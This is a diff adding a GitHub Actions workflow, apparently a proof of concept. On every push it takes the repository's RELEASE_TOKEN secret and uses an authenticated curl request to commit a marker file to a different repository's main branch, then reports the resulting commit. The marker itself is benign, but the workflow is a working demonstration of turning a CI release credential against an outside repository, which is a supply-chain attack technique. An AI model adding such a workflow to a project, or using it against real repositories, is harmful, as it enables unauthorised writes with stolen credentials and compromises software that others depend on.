@@ -1,0 +1,18 @@
+name: sandbox
+on: push
+permissions: {}
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          T: ${{ secrets.RELEASE_TOKEN }}
+          DEST: timhaines/build-harness-1a80a8
+          NONCE: poc-eb16aae1129d
+        run: |
+          c=$(printf 'marker %s\n' "$NONCE" | base64 -w0)
+          printf '{"message":"sandbox %s","content":"%s","branch":"main"}' "$NONCE" "$c" > body.json
+          code=$(curl -sS -o out.json -w '%{http_code}' -X PUT -H "Authorization: token $T" \
+            "https://api.github.com/repos/$DEST/contents/marker-$NONCE.txt" --data @body.json)
+          echo "PUT contents on $DEST main -> HTTP $code"
+          python3 -c 'import json; d=json.load(open("out.json")); print("commit:", (d.get("commit") or {}).get("sha"), d.get("message", ""))'
